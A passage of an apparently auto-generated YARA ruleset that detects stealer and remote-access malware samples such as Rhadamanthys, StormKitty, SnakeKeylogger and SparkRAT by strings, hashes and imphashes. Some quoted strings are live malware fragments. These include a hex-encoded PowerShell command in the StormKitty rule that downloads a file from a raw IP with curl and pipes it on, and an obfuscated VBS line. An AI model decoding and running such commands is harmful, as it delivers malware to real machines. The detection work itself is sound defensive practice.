      $s7 = "8E4A98CDE7070F7F1281BA793DFE5FBF3A73F0945A8AD8EF8993B9430A4F5F6E4FECB2EC4B49607DD4057C3366DDD5AD6B58801E0FBEBD8449098AA1903AC56C" ascii /* score: '11.00'*/
      $s8 = "D18CDB3F8E33DE7A7929C076C8547C430B6E75376DAF4329FA5898EA9F7E391F053DC31E324F18FA6CF4B3EC9C29006EA81CCBC8CF1618057070E07F9790BADF" ascii /* score: '11.00'*/
      $s9 = "69767055DDC7ED05D0C726C4D1B910DF3E0C8EA767636AA8063994D961FF3E284C7454FBDB96078E3A8AB787CBF729BD164088E62B866E564EAD5B6718E1A6CF" ascii /* score: '11.00'*/
      $s10 = "923975C32B29A6D20E711BF6A29EE59393CE0C3C13B24A05392C2133AADCDFD4B156CE82D5276A08E62E9F820459C3D0B410F78711B0E85427F82D25650F5039" ascii /* score: '11.00'*/
      $s11 = "4E890BF5B82D879D4B7D201FE89BDECF7AAB355FE0DB8CCD69F3A413604AFE65378F130FFDB24566099696E65DABD9934298B0CB7F61EE9188999ABFF11738C8" ascii /* score: '11.00'*/
      $s12 = "9A6BC298CEE3FE68EA13060A5A91164B12C535B2989AAA51CE5CDF3495426C8EAEEB8873202A5FD5F3006B7983E0DA4D7D0AF83CEC513B0374EF1AD26989B008" ascii /* score: '11.00'*/
      $s13 = "4F6D77AD53D71AF4B4152A5AF4DABDA9E8EADAAEE099BD984D7C3F271B510FA7D737EE75D4B0AA164F51BA45800E77C8C61645BD49636F5892DEBE4018C7F2FE" ascii /* score: '11.00'*/
      $s14 = "B627DAE177A81CD08B6C64BF3D2FAF996A103186226328639072B929AACEBF782FEF77F90AB98BE4F33FE7D1305FF90A349937C5EF800DF100F187850AAD4C92" ascii /* score: '11.00'*/
      $s15 = "07FA64AE2C23E01B4ABF8E75B25D3CDA6ACFBC343662F1DC2CF3DF11C88B55A9BEBF0E9F8649A68710E71AE096D362B596F822B2F29FCB19B6C7B20FA6D30AB7" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 29000KB and
      8 of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__c6280659 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_c6280659.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c628065901ab4ace9d1ad210594004b1f220d092772956c38c61ba58b4b7ff7b"
   strings:
      $s1 = "DUMPI5|" fullword ascii /* score: '14.00'*/
      $s2 = "* ThbdB&u" fullword ascii /* score: '12.00'*/
      $s3 = "* Ln;1" fullword ascii /* score: '9.00'*/
      $s4 = "* yIdO" fullword ascii /* score: '9.00'*/
      $s5 = "*  cx}" fullword ascii /* score: '9.00'*/
      $s6 = "iLYV- g" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__d41b79e4 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_d41b79e4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d41b79e4ba8c3a6140347afee6ff7ef3272a1dade7fd92c2eda9922c86725b96"
   strings:
      $s1 = ")5\")\\>{b" fullword ascii /* score: '9.00'*/ /* hex encoded string '[' */
      $s2 = "* !8)%" fullword ascii /* score: '9.00'*/
      $s3 = "NEYe4tm" fullword ascii /* score: '9.00'*/
      $s4 = "d.UDmw -M?" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__e62f4b48 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_e62f4b48.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e62f4b4815b88516c2bfe167fe3b12c3d253a914d386b835ed0f3c3f5b0bd7c5"
   strings:
      $s1 = "guAx.MVt;i" fullword ascii /* score: '10.00'*/
      $s2 = "Xj - a" fullword ascii /* score: '9.00'*/
      $s3 = "QLXdLlm" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SnakeKeylogger_signature__3 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8c6eec28987e0d235236b1be59e0ced0fdd8dab7bc23f5fbc7edd037f21c8f94"
   strings:
      $s1 = "ttyyuuiioo.exe" fullword ascii /* score: '22.00'*/
      $s2 = "ttyyuuiioo.exePK" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__21371b611d91188d602926b15db6bd48_imphash_ {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_21371b611d91188d602926b15db6bd48(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6b734c88958bfe7447e6702844486156daf7a54cbd0a1cf9b7bfef98daadf519"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule SnakeKeylogger_signature__21371b611d91188d602926b15db6bd48_imphash__7f2ba583 {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_21371b611d91188d602926b15db6bd48(imphash)_7f2ba583.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f2ba58342f429d0e0ee093fc20b52e1b03db43243bf7838561b9b22ef9588e8"
   strings:
      $s1 = "[]&operat" fullword ascii /* score: '11.00'*/
      $s2 = ";@\\6*B}%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'k' */
      $s3 = "psspucw" fullword ascii /* score: '8.00'*/
      $s4 = "vrrxwvov" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule StormKitty_signature_ {
   meta:
      description = "_subset_batch - file StormKitty(signature).lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "105f0cd63a9da4f552240e772dd57ea6c378f7bda36edb51a00a71c27d4bf06b"
   strings:
      $s1 = "?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s2 = "-window min [Uri]::UnescapeDataString(('6375726c2e6578652027687474703a2f2f3138352e3132352e35302e32372f66696c652e6d703427207c2069" wide /* score: '16.00'*/
      $s3 = "%ProgramFiles%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '15.00'*/
      $s4 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      all of them
}

rule StormKitty_signature__2 {
   meta:
      description = "_subset_batch - file StormKitty(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c1a4b007c675335015b7819bc544d25700a2915f07bc2fa7fdd56dfcf9b1f3aa"
   strings:
      $s1 = "Inv128760.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      all of them
}

rule URSAStealer_signature__2 {
   meta:
      description = "_subset_batch - file URSAStealer(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eb8e55f083397dc2b6d56c10ee7e52ac4f58791d0179cd895ec9738458c4d56e"
   strings:
      $s1 = "WlTCT8G31=WlTCT8G31 & \"jmtykwlohydeiud\"+yXHNN079+\"com/g2\":GetObject(_" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x4773 and filesize < 1KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _Rhadamanthys_signature__87a63f644cb8a20014ebd30c4ceb01d5_imphash__Rhadamanthys_signature__c6663fc96ad3fbeab8e2a6dfb0fa9a63__0 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_87a63f644cb8a20014ebd30c4ceb01d5(imphash).dll, Rhadamanthys(signature)_c6663fc96ad3fbeab8e2a6dfb0fa9a63(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e9e0dd357e1ee5f3b6dd41be46d048eed274297d9affa62337404fc720dd0d34"
      hash2 = "7390db141919d81204d29e707fd71f61fa1f0e78e2300423b97351bd3afed503"
   strings:
      $s1 = "githubusercontent.com" fullword ascii /* score: '29.00'*/
      $s2 = "serveftp.com" fullword ascii /* score: '26.00'*/
      $s3 = "serveirc.com" fullword ascii /* score: '26.00'*/
      $s4 = "blogsyte.com" fullword ascii /* score: '26.00'*/
      $s5 = "logoip.com" fullword ascii /* score: '26.00'*/
      $s6 = "nfshost.com" fullword ascii /* score: '26.00'*/
      $s7 = "Aborted. Incompatible processor: missing feature 0x%llx -%s." fullword ascii /* score: '25.00'*/
      $s8 = "outsystemscloud.com" fullword ascii /* score: '24.00'*/
      $s9 = "stufftoread.com" fullword ascii /* score: '24.00'*/
      $s10 = "publishproxy.com" fullword ascii /* score: '24.00'*/
      $s11 = "servehttp.com" fullword ascii /* score: '24.00'*/
      $s12 = "blogspot.com.eg" fullword ascii /* score: '22.00'*/
      $s13 = "blogspot.com.ng" fullword ascii /* score: '22.00'*/
      $s14 = "blogspot.com.uy" fullword ascii /* score: '22.00'*/
      $s15 = "blogspot.com.co" fullword ascii /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__32687360_Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c_1 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash2 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash3 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
   strings:
      $s1 = "3>363.3&3" fullword ascii /* reversed goodware string '3&3.363>3' */ /* score: '19.00'*/ /* hex encoded string '3c3' */
      $s2 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0 " fullword ascii /* score: '16.00'*/
      $s3 = "ofSYkYVUp" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s4 = "dYnhYdFYo" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s5 = "https://mozilla.org0/" fullword ascii /* score: '12.00'*/
      $s6 = "1~1v1n1f1^1V1N1F1>161.1&1" fullword ascii /* reversed goodware string '1&1.161>1F1N1V1^1f1n1v1~1' */ /* score: '11.00'*/
      $s7 = "1j1J1*1" fullword ascii /* reversed goodware string '1*1J1j1' */ /* score: '11.00'*/
      $s8 = "4z4[4&3" fullword ascii /* reversed goodware string '3&4[4z4' */ /* score: '11.00'*/
      $s9 = "4M4?4!4" fullword ascii /* reversed goodware string '4!4?4M4' */ /* score: '11.00'*/
      $s10 = "0~0v0n0f0^0V0N0F0>060.0&0" fullword ascii /* reversed goodware string '0&0.060>0F0N0V0^0f0n0v0~0' */ /* score: '11.00'*/
      $s11 = "1<1,1(1$1 1" fullword ascii /* reversed goodware string '1 1$1(1,1<1' */ /* score: '11.00'*/
      $s12 = "2j2J2*2" fullword ascii /* reversed goodware string '2*2J2j2' */ /* score: '11.00'*/
      $s13 = "9n9S9+8" fullword ascii /* reversed goodware string '8+9S9n9' */ /* score: '11.00'*/
      $s14 = "8o8i8S8" fullword ascii /* reversed goodware string '8S8i8o8' */ /* score: '11.00'*/
      $s15 = "8x8f8T8B808" fullword ascii /* reversed goodware string '808B8T8f8x8' */ /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 8 of them )
      ) or ( all of them )
}

rule _SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__2 {
   meta:
      description = "_subset_batch - from files SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash2 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
   strings:
      $x1 = "(aliasescsiso111ecmacyrilliccsiso159jisx02121990csiso2intlrefversioncsiso70videotexsupp1csiso91jisc62291984acsiso92jisc62991984b" ascii /* score: '81.00'*/
      $x2 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '72.50'*/
      $x3 = "28421709430404007434844970703125: day-of-year does not match dayCertAddCertificateContextToStoreCertVerifyCertificateChainPolicy" ascii /* score: '71.50'*/
      $x4 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryIA5String contains i" ascii /* score: '71.50'*/
      $x5 = "9guacuiababia-goracleaningroks-theatree164-balsfjordd-dnshome-webservercellikes-piedmonticellocalzoneastasiaetnaamesjevuemielnod" ascii /* score: '70.00'*/
      $x6 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii /* score: '69.50'*/
      $x7 = "_examplesamiga1251andslope;angmsdaa;angmsdab;angmsdac;angmsdad;angmsdae;angmsdaf;angmsdag;angmsdah;angrtvbd;approxeq;atomicor8aw" ascii /* score: '66.50'*/
      $x8 = "tls: certificate used with invalid signature algorithmtls: server resumed a session with a different versionx509: cannot verify " ascii /* score: '65.50'*/
      $x9 = "attempt to clear non-empty span setattribute name without = in elementbad successive approximation valuescan't get IEnumVARIANT," ascii /* score: '65.50'*/
      $x10 = "entersyscalleqslantless;exit status expectation;feMorphologyfePointLightfeTurbulencefemorphologyfepointlightfeturbulencegcBitsAr" ascii /* score: '65.00'*/
      $x11 = "non-IPv4 addressnon-IPv6 addressntrianglelefteq;object is remotepatternTransformpatterntransformproxy-connectionread_frame_other" ascii /* score: '63.00'*/
      $x12 = "100-continue152587890625762939453125> but have <Bidi_ControlCIDR addressCOMMAND_EXECCONTINUATIONCfgMgr32.dllChooseColorWCircleMi" ascii /* score: '60.00'*/
      $x13 = "ISO-8859-9ISO_8859-9:1989address type not supportedasn1: invalid UTF-8 stringbad certificate hash valuebase 128 integer too larg" ascii /* score: '58.50'*/
      $x14 = "()<>@,;:\\\"/[]?= , not a function.WithValue(type /api/bridge/pull/api/bridge/push0123456789ABCDEF0123456789abcdef2006/01/02 15:" ascii /* score: '57.00'*/
      $x15 = "flate: internal error: frame_goaway_has_streamframe_headers_pad_shortframe_rststream_bad_lengarbage collection scangcDrain phase" ascii /* score: '52.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__3 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash2 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
   strings:
      $s1 = "eyexeCKK4]e" fullword ascii /* score: '17.00'*/
      $s2 = "@M4yGeTeyeV&S4uW&S4he;X&I4Ct&R" fullword ascii /* score: '14.00'*/
      $s3 = "vS&Ne_&Ke^&[&nie`ex&+g&x4ze/nRejpTe?4j&Le{G4KeleN4Y&_e~4}i4MeIeL4T&geye]eweTH4ve7~&co&\\&kGet2" fullword ascii /* score: '14.00'*/
      $s4 = "XXXXXV" fullword ascii /* reversed goodware string 'VXXXXX' */ /* score: '13.50'*/
      $s5 = "T4X<4|&Keyi^eh&=q&74q&r4rjeAs&EyeV&r4Ve*[4Yem4_K[4" fullword ascii /* score: '12.00'*/
      $s6 = "eRP&pe[4QeYe}&p&\\Re=4pS4{4wQ&iex4m4Ve|&.QeO>U4x&g" fullword ascii /* score: '12.00'*/
      $s7 = "P4ot&>4{&U{y4Ge0_exeIe_e/Tt4\\4lKkeYe:I&P&~9" fullword ascii /* score: '12.00'*/
      $s8 = "4q4Z4s4W`&Keyen&Y4V&z&lemeMel4y4O&u&hT4R" fullword ascii /* score: '12.00'*/
      $s9 = "4geYt&Je[&meYeS&j4M0h4`4{4Akey484_p&hem" fullword ascii /* score: '12.00'*/
      $s10 = "&O&74hG4me*peX&keye5}4" fullword ascii /* score: '12.00'*/
      $s11 = "Se;8keTeGkeyep&S4Aq&936WeL4" fullword ascii /* score: '12.00'*/
      $s12 = "15Pes4N|~e*8u`K&G4j`euL&Zm4h&|&Zen>o_x4Keye`eu4{4" fullword ascii /* score: '12.00'*/
      $s13 = "IekeyeCI4TeP4TeH&R4ge\\B?~weve|" fullword ascii /* score: '12.00'*/
      $s14 = "4Uz&TekeYere~4q`4l&>4G&Pem4V4x&Qe" fullword ascii /* score: '12.00'*/
      $s15 = "ECRe}?Yew4XeXeCqe^l&h4v4JpegeWeM&Y&S4_&h4I4F" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 8 of them )
      ) or ( all of them )
}

rule _SVCStealer_signature__456e8615ad4320c9f54e50319a19df9c_imphash__SVCStealer_signature__456e8615ad4320c9f54e50319a19df9c_imph_4 {
   meta:
      description = "_subset_batch - from files SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash).exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_0f1b3601.exe, SVCStealer(signature)_456e8615ad4320c9f54e50319a19df9c(imphash)_bdca7eab.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "91c48122fad932eb549ca8cf2734a73b21a5b4b2aefe3d86e675586d2ee091b0"
      hash2 = "0f1b3601c91c1a1de03108c26a491f567ad3c0603313e5b5b0f2a530984ccc92"
      hash3 = "bdca7eabc43d49ace207da10ffafcebbcd4fb26e4a779339878386953b5da6d3"
   strings:
      $x1 = "bapi-ms-win-core-processthreads-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x2 = "bapi-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x3 = "bapi-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $x4 = "bapi-ms-win-core-processenvironment-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $s5 = "bapi-ms-win-core-namedpipe-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s6 = "bapi-ms-win-core-libraryloader-l1-1-0.dll" fullword ascii /* score: '29.00'*/
      $s7 = "bapi-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s8 = "bapi-ms-win-crt-runtime-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s9 = "4python38.dll" fullword ascii /* score: '23.00'*/
      $s10 = "bpython38.dll" fullword ascii /* score: '23.00'*/
      $s11 = "bapi-ms-win-core-errorhandling-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s12 = "bucrtbase.dll" fullword ascii /* score: '23.00'*/
      $s13 = "bapi-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s14 = "bapi-ms-win-crt-convert-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s15 = "bapi-ms-win-core-string-l1-1-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and pe.imphash() == "456e8615ad4320c9f54e50319a19df9c" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__57e865fd_RustyStealer_signature__b4b75a16_RustyStealer_signature__e0c6a834_5 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_57e865fd.msi, RustyStealer(signature)_b4b75a16.msi, RustyStealer(signature)_e0c6a834.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "57e865fda24644ac7bdae3c4408a61f61e8da4a051134924e069fdbd7528aa57"
      hash2 = "b4b75a1667562bac7e6cbd8f519fb429f6c067ef2fb4724dcf625ab03bea3d68"
      hash3 = "e0c6a8346602143c2f318963fa030394c398bc17023a3b4ff82d18b45e8f1ae0"
   strings:
      $x1 = "Failed to get elevation token from process." fullword ascii /* score: '38.00'*/
      $x2 = "upDependenciesStartNamePasswordArgumentsDescriptionPDQ Connect AgentLOCALSYSTEM--servicePDQ.com software deployment serviceServi" ascii /* score: '34.00'*/
      $x3 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */ /* score: '33.00'*/
      $s4 = "failed to get WixUnelevatedShellExecTarget" fullword ascii /* score: '30.00'*/
      $s5 = "eSizeVersionLanguageAttributesSequence05.8.18.0p-lw7ji3.exe|pdq-connect-agent.exeComponent.pdqconnectagentpdqconnectagent8e1yztm" ascii /* score: '30.00'*/
      $s6 = "failed to get WixShellExecBinaryId" fullword ascii /* score: '29.00'*/
      $s7 = "failed to get handle to kernel32.dll" fullword ascii /* score: '28.00'*/
      $s8 = "Skipping ConfigureEventManifestRegister() because the target system does not support event manifest" fullword ascii /* score: '28.00'*/
      $s9 = "Skipping ConfigurePerfmonManifestRegister() because the target system does not support perfmon manifest" fullword ascii /* score: '28.00'*/
      $s10 = "Skipping ConfigureEventManifestUnregister() because the target system does not support event manifest" fullword ascii /* score: '28.00'*/
      $s11 = "Skipping ConfigurePerfmonManifestUnregister() because the target system does not support perfmon manifest" fullword ascii /* score: '28.00'*/
      $s12 = "failed to process target from CustomActionData" fullword ascii /* score: '28.00'*/
      $s13 = "ShelExecUnelevated failed with target %ls" fullword ascii /* score: '28.00'*/
      $s14 = "Failed to get the RmEndSession procedure from rstrtmgr.dll." fullword ascii /* score: '27.00'*/
      $s15 = "WixUnelevatedShellExecTarget is %ls" fullword ascii /* score: '27.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 15000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__32cfff30_Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c_6 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash2 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
   strings:
      $x1 = "<msiOptions> - options for msiexec.exe on running the MSI package" fullword wide /* score: '32.00'*/
      $s2 = "Unsupported command file format. The supported file formats are: ANSI, UTF-8, Unicode Little Endian and Unicode Big Endian. The " wide /* score: '30.00'*/
      $s3 = "#- launches the EXE setup without UI&- launches the EXE setup with basic UI'- list languages supported by the setup?<lang_id> - " wide /* score: '26.00'*/
      $s4 = "Setup package was encrypted using AES 256 algorithm. To continue the setup process, you should provide the password needed to de" wide /* score: '25.00'*/
      $s5 = "e Mode=TemplatedParent}, TargetNullValue={ThemeResource ComboBoxPlaceHolderForegroundFocusedPressed}}\" />" fullword ascii /* score: '23.00'*/
      $s6 = "e Mode=TemplatedParent}, TargetNullValue={ThemeResource ComboBoxForegroundDisabled}}\" />" fullword ascii /* score: '23.00'*/
      $s7 = "e Mode=TemplatedParent}, TargetNullValue={ThemeResource ComboBoxForegroundFocused}}\" />" fullword ascii /* score: '23.00'*/
      $s8 = "                <!-- <PointerUpThemeAnimation Storyboard.TargetName=\"ContentPresenter\"/>-->" fullword ascii /* score: '23.00'*/
      $s9 = "<ObjectAnimationUsingKeyFrames Storyboard.TargetName=\"ContentPresenter\" Storyboard.TargetProperty=\"BorderThickness\">" fullword ascii /* score: '22.00'*/
      $s10 = "SurfsharkSetup.exe" fullword wide /* score: '22.00'*/
      $s11 = "eSource={RelativeSource Mode=TemplatedParent}, TargetNullValue={ThemeResource TextControlPlaceholderForegroundFocused}}\" />" fullword ascii /* score: '21.00'*/
      $s12 = "                      <Setter Target=\"PlaceholderTextContentPresenter.Foreground\" Value=\"{Binding PlaceholderForeground, Rela" ascii /* score: '21.00'*/
      $s13 = "                      <Setter Target=\"PlaceholderTextContentPresenter.Foreground\" Value=\"{Binding PlaceholderForeground, Rela" ascii /* score: '21.00'*/
      $s14 = "                      <Setter Target=\"PlaceholderTextContentPresenter.Foreground\" Value=\"{Binding PlaceholderForeground, Rela" ascii /* score: '21.00'*/
      $s15 = "                        <DiscreteObjectKeyFrame KeyTime=\"0\" Value=\"{Binding PlaceholderForeground, RelativeSource={RelativeSo" ascii /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "a520fd20530cf0b0db6a6c3c8b88d11d" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d_imphash__b7b7d002_Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c_7 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash2 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
   strings:
      $x1 = "owner diedschedtracesemacquiresetsockoptws2_32.dll  of size  CloseHandleCreateFileWDeleteFileWExitProcessFreeLibraryGOTRACEBACKG" ascii /* score: '71.00'*/
      $x2 = "file descriptor in bad stateprotocol driver not attachedruntime: bad lfnode address executing on Go runtime stackmachine is not " ascii /* score: '42.00'*/
      $x3 = "connection refusedfile name too longgarbage collectionidentifier removedinput/output errormultihop attemptedno child processesno" ascii /* score: '37.00'*/
      $x4 = "CreateDirectoryWDnsNameCompare_WFlushFileBuffersGC worker (idle)GetComputerNameWGetFullPathNameWGetLongPathNameWNetApiBufferFree" ascii /* score: '35.00'*/
      $x5 = "dllfile existsgccheckmarkgetpeernamegetsocknamemswsock.dllnot reachedscheddetailsecur32.dllshell32.dlluserenv.dll gcscandone Get" ascii /* score: '32.00'*/
      $x6 = "wrong medium type  but memory size  to non-Go memory CommandLineToArgvWCreateFileMappingWGetExitCodeProcessGetFileAttributesWLoo" ascii /* score: '31.00'*/
      $x7 = "ingGetCurrentProcessGetShortPathNameWLookupAccountSidWWSAEnumProtocolsWexec format errorno data availablepermission deniedruntim" ascii /* score: '31.00'*/
      $s8 = "exchange fullgethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '30.00'*/
      $s9 = "lchan receivedumping heapgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dllnetapi32.dll gcscanvalid  is ni" ascii /* score: '29.00'*/
      $s10 = "GOMAXPROCSGetIfEntryGetVersionWSACleanupWSAStartup_MSpanDead_MSpanFreednsapi.dllgetsockoptinvalidptrntdll.dll" fullword ascii /* score: '28.00'*/
      $s11 = "connection refusedfile name too longgarbage collectionidentifier removedinput/output errormultihop attemptedno child processesno" ascii /* score: '28.00'*/
      $s12 = "level 3 resetsrmount errortimer expiredvalue method  out of range  procedure in CertCloseStoreCreateProcessWCryptGenRandomFindFi" ascii /* score: '27.00'*/
      $s13 = "owner diedschedtracesemacquiresetsockoptws2_32.dll  of size  CloseHandleCreateFileWDeleteFileWExitProcessFreeLibraryGOTRACEBACKG" ascii /* score: '27.00'*/
      $s14 = "etCurrentProcessIdGetTokenInformationWaitForSingleObjectbad file descriptordevice not a streamdirectory not emptydisk quota exce" ascii /* score: '26.00'*/
